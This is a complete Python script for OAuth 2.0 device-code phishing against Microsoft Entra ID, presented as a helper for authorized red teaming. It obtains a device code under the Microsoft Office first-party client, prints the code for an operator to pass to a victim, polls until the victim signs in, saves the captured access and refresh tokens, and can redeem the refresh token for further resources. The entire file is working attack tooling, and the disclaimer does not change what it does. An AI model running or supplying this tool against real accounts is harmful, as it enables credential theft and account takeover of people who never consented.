#!/usr/bin/env python3
"""
agent.py - OAuth 2.0 device-code phishing helper for authorized Entra ID red teaming.

Implements the real Microsoft Entra ID device authorization grant (RFC 8628):
  1. POST /devicecode  -> obtain user_code + device_code
  2. Display the pretext text the operator delivers to the (consenting/lab) victim
  3. Poll /token with grant_type=urn:ietf:params:oauth:grant-type:device_code
  4. Optionally redeem the captured refresh_token against another first-party resource

AUTHORIZED USE ONLY. Run exclusively against tenants you own or have explicit
written authorization (rules of engagement) to test. Device-code phishing
manipulates real identities; unauthorized use violates the CFAA and equivalent law.

References:
  - RFC 8628                https://datatracker.ietf.org/doc/html/rfc8628
  - Microsoft device code   https://learn.microsoft.com/entra/identity-platform/v2-oauth2-device-code
"""
import argparse
import base64
import json
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

# Microsoft Office first-party client (pre-authorized for broad first-party resources)
DEFAULT_CLIENT = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
AUTHORITY = "https://login.microsoftonline.com"


def _post(url: str, fields: dict) -> dict:
    """POST application/x-www-form-urlencoded and return parsed JSON (even on HTTP errors)."""
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(
        url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        try:
            return json.loads(body)
        except json.JSONDecodeError:
            return {"error": "http_error", "error_description": f"{e.code}: {body}"}
    except urllib.error.URLError as e:
        return {"error": "network_error", "error_description": str(e.reason)}


def request_device_code(tenant: str, client_id: str, scope: str) -> dict:
    url = f"{AUTHORITY}/{tenant}/oauth2/v2.0/devicecode"
    resp = _post(url, {"client_id": client_id, "scope": scope})
    if "device_code" not in resp:
        print(f"[!] devicecode request failed: {resp.get('error')}: "
              f"{resp.get('error_description')}", file=sys.stderr)
        sys.exit(2)
    return resp


def poll_for_tokens(tenant: str, client_id: str, device_code: str,
                    interval: int, expires_in: int) -> dict:
    url = f"{AUTHORITY}/{tenant}/oauth2/v2.0/token"
    fields = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": client_id,
        "device_code": device_code,
    }
    deadline = time.time() + expires_in
    while time.time() < deadline:
        resp = _post(url, fields)
        if "access_token" in resp:
            return resp
        err = resp.get("error")
        if err == "authorization_pending":
            time.sleep(interval)
            continue
        if err == "slow_down":
            interval += 5
            time.sleep(interval)
            continue
        # authorization_declined, expired_token, bad_verification_code, etc.
        print(f"[!] polling stopped: {err}: {resp.get('error_description')}",
              file=sys.stderr)
        return resp
    return {"error": "timeout", "error_description": "device code window expired"}


def decode_jwt_payload(token: str) -> dict:
    try:
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except (IndexError, ValueError):
        return {}


def refresh_to_resource(tenant: str, client_id: str, refresh_token: str,
                        scope: str) -> dict:
    url = f"{AUTHORITY}/{tenant}/oauth2/v2.0/token"
    return _post(url, {
        "grant_type": "refresh_token",
        "client_id": client_id,
        "refresh_token": refresh_token,
        "scope": scope,
    })


def main() -> int:
    p = argparse.ArgumentParser(description="Authorized device-code phishing helper (RFC 8628).")
    p.add_argument("--tenant", default="organizations",
                   help="Tenant id or 'organizations'/'common' (default: organizations)")
    p.add_argument("--client-id", default=DEFAULT_CLIENT,
                   help="First-party/registered client id")
    p.add_argument("--scope", default="https://graph.microsoft.com/.default offline_access",
                   help="Requested scope (include offline_access for a refresh token)")
    p.add_argument("--out", default="tokens.json", help="File to write captured tokens")
    p.add_argument("--refresh-to", metavar="SCOPE",
                   help="After capture, redeem the refresh token for this scope")
    args = p.parse_args()

    dc = request_device_code(args.tenant, args.client_id, args.scope)
    print("=" * 70)
    print("[*] DELIVER THIS TO THE AUTHORIZED TEST USER (plain text, no links):")
    print(f"    URL : {dc.get('verification_uri')}")
    print(f"    CODE: {dc.get('user_code')}")
    print(f"    (valid for {dc.get('expires_in')}s)")
    print("=" * 70)
    print("[*] Polling token endpoint...")

    tokens = poll_for_tokens(args.tenant, args.client_id, dc["device_code"],
                             int(dc.get("interval", 5)), int(dc.get("expires_in", 900)))
    if "access_token" not in tokens:
        return 1

    with open(args.out, "w") as fh:
        json.dump(tokens, fh, indent=2)
    print(f"[+] Tokens captured -> {args.out}")
    claims = decode_jwt_payload(tokens["access_token"])
    print(f"[+] Identity : {claims.get('upn') or claims.get('unique_name') or claims.get('oid')}")
    print(f"[+] Audience : {claims.get('aud')}")
    print(f"[+] Scopes   : {tokens.get('scope')}")

    if args.refresh_to and tokens.get("refresh_token"):
        print(f"[*] Redeeming refresh token for scope: {args.refresh_to}")
        rt = refresh_to_resource(args.tenant, args.client_id,
                                 tokens["refresh_token"], args.refresh_to)
        if "access_token" in rt:
            new_claims = decode_jwt_payload(rt["access_token"])
            print(f"[+] New token audience: {new_claims.get('aud')}")
            with open("tokens_refreshed.json", "w") as fh:
                json.dump(rt, fh, indent=2)
            print("[+] Refreshed token -> tokens_refreshed.json")
        else:
            print(f"[!] refresh failed: {rt.get('error')}: {rt.get('error_description')}",
                  file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
